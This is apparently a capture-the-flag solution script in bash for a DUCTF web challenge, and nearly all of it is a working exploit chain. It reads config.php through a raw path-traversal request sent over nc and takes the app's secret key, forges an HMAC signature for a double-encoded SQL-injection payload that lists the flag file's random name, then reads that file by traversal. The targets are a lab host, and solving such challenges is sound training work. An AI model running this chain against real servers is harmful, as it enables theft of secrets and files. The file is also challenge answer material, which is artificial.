#!/usr/bin/env bash
set -euo pipefail

PAYLOAD='/api/animal/`,imagedir%2520from%2520(select%25201%2520as%2520`%2527`,0x676c6f623a2f2f2f662a%2520as%2520imagedir)x;/fields/%255c%253f%2500%2523x'

for _ in $(seq 1 60); do
  if curl --silent --fail --max-time 2 http://target:8116/ >/dev/null; then
    break
  fi
  sleep 1
done

KEY=$(
  (sleep 6; printf 'GET http://target:8116?/static/../config.php$ HTTP/1.1\r\nHost: target:8116\r\n\r\n'; sleep 1) |
    nc -w 10 target 8116 |
    grep -oE '[a-f0-9]{32}' |
    head -n 1 || true
)

if [ -z "${KEY}" ]; then
  echo "failed to recover APP_SECRET_KEY" >&2
  exit 1
fi

SIG=$(
  python3 - <<'PY' "${KEY}" "${PAYLOAD}"
import hashlib
import hmac
import sys
import urllib.parse

key = sys.argv[1].encode()
payload = urllib.parse.unquote(urllib.parse.unquote(sys.argv[2]))
print(hmac.new(key, payload.encode(), hashlib.sha256).hexdigest())
PY
)

FLAGPATH=$(
  curl --silent --path-as-is \
    -H "X-Signature: ${SIG}" \
    "http://target:8116/index.php${PAYLOAD}" |
    grep -oE 'flag-[a-f0-9]+\.txt' |
    head -n 1 || true
)

if [ -z "${FLAGPATH}" ]; then
  echo "failed to recover randomized flag path" >&2
  exit 1
fi

FLAG=$(
  (sleep 6; printf 'GET http://target:8116?/static/../../../../../../../../../../%s HTTP/1.1\r\nHost: target:8116\r\n\r\n' "${FLAGPATH}"; sleep 1) |
    nc -w 10 target 8116 |
    tr -d '\r' |
    grep -oE 'DUCTF\{[^}]+\}' |
    head -n 1 || true
)

if [ -z "${FLAG}" ]; then
  echo "failed to recover flag contents" >&2
  exit 1
fi

printf '%s\n' "${FLAG}" > /app/flags.txt
